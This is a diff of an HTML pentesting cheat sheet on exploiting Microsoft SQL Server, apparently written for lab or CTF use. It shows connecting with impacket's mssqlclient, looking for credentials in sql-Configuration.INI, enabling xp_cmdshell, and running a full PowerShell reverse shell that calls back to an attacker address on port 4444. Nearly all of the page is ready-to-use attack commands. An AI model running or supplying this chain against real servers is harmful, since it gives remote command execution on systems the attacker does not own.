@@ -27,21 +27,25 @@
             <h3> Connect to DB </h3>
             <ul>
                 <p> You must have impacket suit installed (/examples directory)</p>
-                <pre><code class="language-bash">python3 mssqlclient.py -windows-auth DOMAIN/USER:PASSWORD@IP_VICTIM</code></pre>
+                <pre><code class="language-bash">python3 mssqlclient.py user:password@IP_VICTIM</code></pre>
             </ul>
-            
+            <h2>Enumeration</h2>
+            <ul>
+                <p>Files that may contain credentials</p>
+                <pre><code class="language-bash">sql-Configuration.INI</code></pre>
+            </ul>
+
             <h2> Exploitation </h2>
             <ul>
                 <h3> Configuration to execute commands from BBDD system</h3>
 
-                <pre><code class="language-sql">EXEC sp_configure ‘show advanced options’, 1;
-    RECONFIGURE;
+                <pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
 
-    EXEC sp_configure ‘xp_cmdshell’, 1;
-    RECONFIGURE;
-    </code></pre>
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;</code></pre>
                 <h3> Reverse Socket connection </h3>
-                <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''LOCAL_IP'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"'; </code></pre>
+                <pre><code class="language-sql">EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.18'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}"';</code></pre>
             </ul>
             
             
